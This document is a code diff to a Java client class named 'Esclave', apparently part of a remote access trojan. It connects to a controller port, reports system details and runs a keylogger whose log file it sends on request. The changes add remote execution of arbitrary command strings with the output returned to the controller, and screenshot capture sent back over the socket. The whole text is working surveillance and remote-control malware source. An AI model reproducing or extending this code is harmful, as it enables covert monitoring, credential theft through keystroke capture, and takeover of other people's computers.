@@ -14,9 +14,11 @@ import java.net.Socket;
 import java.net.UnknownHostException;
 
 import constante.Constante;
+import remote.action.CMD;
 import remote.action.Keylogging;
 import remote.action.Notification;
 import remote.action.RemoteActions;
+import remote.action.ScreenShot;
 import send.specific.object.SendSpecificObject;
 
 public class Esclave {
@@ -30,8 +32,9 @@ public class Esclave {
 	private Socket s;
 	private Keylogging klgg;
 	private Robot robot;
+	private CMD cmd = null;
 
-	public Esclave() {
+	public Esclave() throws ClassNotFoundException, InterruptedException {
 
 		try {
 			s = new Socket(InetAddress.getLocalHost(), portMaitre);
@@ -50,13 +53,14 @@ public class Esclave {
 					+ " " + os_version + " " + os_name + " " + os_arch + " "
 					+ user_country);
 			out.flush();
-			
 			klgg = new Keylogging(this);
 			robot = new Robot();
+			this.receive();
 		} catch (IOException | AWTException e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
 		}
+
 	}
 
 	public void receive() throws ClassNotFoundException, IOException,
@@ -71,27 +75,54 @@ public class Esclave {
 						action = (Object) in.readObject();
 
 						if (action instanceof Integer) {
-							Integer code=(Integer) action;
-							if(code.equals(Constante.code_keylog)){
+							Integer code = (Integer) action;
+							if (code.equals(Constante.code_keylog)) {
 								sendfileKeylog();
-							}
-							else if(code.equals(Constante.code_notif)){
-								Notification notif=new Notification();
-							}
-							else{
+								
+							} else if (code.equals(Constante.code_notif)) {
+								Notification notif = new Notification();
+							} else if (code.equals(Constante.code_cmd)) {
+								// System.out.println("[debug] Nouveau requete CMD: ");
+
+								if (cmd == null)
+									cmd = new CMD();
+								action = (Object) in.readObject();
+								if (action instanceof String) {
+									String instruction = (String) action;
+									String res = cmd
+											.nouvellecommande(instruction);
+									// System.out.println("[debug]"+res);
+									out.writeObject(Constante.code_cmd);
+									out.flush();
+									out.writeObject(res);
+									out.flush();
+								}
+							} else {
 								System.out.println("Objet non identifie");
 							}
-						}
-						else if(action instanceof RemoteActions){
-							RemoteActions remoteaction=(RemoteActions) action;
-							Object result=((RemoteActions) action).executer(robot);
-							if(result != null){
-								Integer code=120;
-								out.writeObject(120);
+						} else if (action instanceof RemoteActions) {
+							RemoteActions remoteaction = (RemoteActions) action;
+							Object result = ((RemoteActions) remoteaction)
+									.executer(robot);
+							if (result != null) {
+
+								out.writeObject(Constante.code_vnc);
 								out.flush();
-								out.writeObject(result);
-								out.flush();
-								out.reset();
+								if (result instanceof ScreenShot) {
+									byte[] size = ((ScreenShot) result)
+											.getsize();
+									if (!size.equals(null)) {
+										out.writeObject(size);
+										;
+										out.writeObject(result);
+										out.flush();
+										out.reset();
+									}
+								} else {
+									out.writeObject(result);
+									out.flush();
+									out.reset();
+								}
 							}
 						}
 					}
@@ -110,8 +141,6 @@ public class Esclave {
 		recevoir.start();
 	}
 
-	
-
 	public void sendfileKeylog() throws IOException, InterruptedException {
 		String chemin = Keylogging.cheminFile;
 		klgg.arreteKeylog();
@@ -122,6 +151,5 @@ public class Esclave {
 	public static void main(String[] args) throws ClassNotFoundException,
 			IOException, InterruptedException {
 		Esclave esclave = new Esclave();
-		esclave.receive();
 	}
 }
